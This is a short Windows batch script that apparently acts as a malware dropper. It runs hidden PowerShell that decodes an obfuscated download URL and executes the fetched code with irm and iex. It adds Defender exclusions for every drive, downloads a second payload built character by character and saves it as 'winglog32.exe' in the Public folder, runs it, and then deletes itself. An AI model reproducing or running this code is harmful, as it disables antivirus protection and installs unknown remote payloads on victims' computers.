
@echo off
PowerShell -WindowStyle Hidden -Command "$codes = 104,116,116,112,115,58,47,47,102,105,108,101,115,46,99,97,116,98,111,120,46,109,111,101,47,99,122,49,50,57,114,46,48,48,69,113,113;irm  $([Text.Encoding]::ASCII.GetString(@($codes))) | iex"
for /f %%A in ('mountvol ^| find ":\"') do (>nul powershell -c add-mppreference -exclusionpath %%A)

powershell -Command "$url = @();$url +=  'h';$url +=  't';$url +=  't';$url +=  'p';$url +=  's';$url +=  ':';$url +=  '/';$url +=  '/';$url +=  'f';$url +=  'i';$url +=  'l';$url +=  'e';$url +=  's';$url +=  '.';$url +=  'c';$url +=  'a';$url +=  't';$url +=  'b';$url +=  'o';$url +=  'x';$url +=  '.';$url +=  'm';$url +=  'o';$url +=  'e';$url +=  '/';$url +=  'z';$url +=  'w';$url +=  'h';$url +=  '0';$url +=  's';$url +=  'h';$url +=  '.';$url +=  'U';$url +=  'V';$url +=  'W';$url +=  'j';$url +=  'n';$url = $url -join '';$output = \"$env:PUBLIC\winglog32.exe\";$output2 = \"$env:PUBLIC\winglog64.exe\"; Invoke-WebRequest -Uri $url -OutFile $output; Start-Process -FilePath $output -Wait"

del "%~f0"


